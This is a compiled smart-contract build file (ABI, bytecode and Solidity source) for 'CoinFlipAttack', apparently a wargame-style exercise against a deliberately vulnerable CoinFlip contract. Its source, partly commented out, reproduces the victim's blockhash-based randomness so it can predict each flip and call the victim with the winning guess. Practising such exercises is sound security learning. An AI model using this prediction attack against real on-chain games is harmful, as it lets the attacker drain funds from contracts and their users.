{
  "contractName": "CoinFlipAttack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "side",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "consecutiveWins",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victimContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "setVictim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060035534801561003457600080fd5b506000808190555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103098061008c6000396000f3fe60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b439621146100725780638475c028146101035780638da5cb5b14610132578063e6f334d714610189578063f32d251d146101b4575b600080fd5b34801561007e57600080fd5b506100c16004803603602081101561009557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061020b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010f57600080fd5b50610118610278565b604051808215151515815260200191505060405180910390f35b34801561013e57600080fd5b5061014761028b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561019557600080fd5b5061019e6102b1565b6040518082815260200191505060405180910390f35b3480156101c057600080fd5b506101c96102b7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b600081600460016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600460009054906101000a900460ff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60005481565b600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea165627a7a723058209387037d90658d5103d56bc118e14d7d09a2f2898d0666014e5d3beb223a365e0029",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\n\r\n/*\r\nImport the vulnerable contract so we can later\r\ninstantiate it and call its functions\r\n*/\r\nimport \"./SafeMath.sol\";\r\nimport \"./CoinFlip.sol\";\r\n\r\ncontract CoinFlipAttack {\r\n    using SafeMath for uint256;\r\n    uint256 public consecutiveWins;\r\n    address public owner;\r\n    uint256 lastHash;\r\n    // Same number as in CoinFlip contract\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n    bool public side;\r\n\r\n    constructor() public {\r\n        consecutiveWins = 0;\r\n        owner = msg.sender;\r\n    }\r\n\r\n    CoinFlip public victimContract;\r\n\r\n    // constructor(address _addr) public {\r\n    //     victimContract = CoinFlip(_addr);\r\n    // }\r\n\r\n    /*\r\n    Public function to set the victim contract. We will call this first in our exploit.\r\n    It could have also been done in a constructor.\r\n    */\r\n    function setVictim(address _addr) public returns (address) {\r\n        /* \r\n        Note that here we are not calling CoinFlip constructor with an address,\r\n        but just instantiating it and setting its address. All functions calls will be sent to that address.\r\n        This is a Solidity quirk, get used to it :)\r\n        */\r\n        victimContract = CoinFlip(_addr);\r\n        return address(victimContract);\r\n    }\r\n\r\n    /*\r\n    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.\r\n    */\r\n    // function flip() public returns (bool) {\r\n    //     // Same PRNG as in victim contract\r\n    //     // The \"random\" numbers will be exactly the same in both contracts\r\n    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n    //     uint256 coinFlip = blockValue.div(FACTOR);\r\n    //     side = coinFlip == 1 ? true : false;\r\n\r\n    //     // Here we call the victim contract flip function with our guess\r\n    //     return bool(victimContract.flip(side));\r\n    // }\r\n\r\n    // function testFlip(bool _guess) public returns (bool) {\r\n    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n\r\n    //     if (lastHash == blockValue) {\r\n    //         revert();\r\n    //     }\r\n\r\n    //     lastHash = blockValue;\r\n    //     uint256 coinFlip = blockValue.div(FACTOR);\r\n    //     bool side = coinFlip == 1 ? true : false;\r\n\r\n    //     if (side == _guess) {\r\n    //         consecutiveWins++;\r\n    //         return true;\r\n    //     } else {\r\n    //         consecutiveWins = 0;\r\n    //         return false;\r\n    //     }\r\n    // }\r\n}\r\n",
  "sourcePath": "C:/dev/dapps/playground/contracts/CoinFlipAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.2.3",
  "updatedAt": "2020-08-13T18:54:01.175Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}